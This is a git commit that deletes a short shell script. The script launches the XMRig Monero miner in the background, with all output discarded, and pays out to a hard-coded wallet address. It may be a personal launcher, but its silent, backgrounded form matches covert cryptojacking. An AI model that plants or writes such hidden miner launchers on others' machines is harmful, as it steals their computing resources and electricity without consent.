9e15149eb00771c82a3f389b20382061bcb5da83
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-01-20 14:34:33 +0000

    Delete x.sh

--- x.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-cd && cd Documents && cd xmrig && cd build && ./xmrig -o pool.minexmr.com:443 -u 47fYWmH5mcShArotMMh7vkQF3WmqkWyQr5uES4PPMtonaLZaBdM6MJYCrHC741RV9KRzhvoWirvi6WYhyeWKnRbd2A7uSae -k --tls --rig-id Linux  > /dev/null 2>&1 &
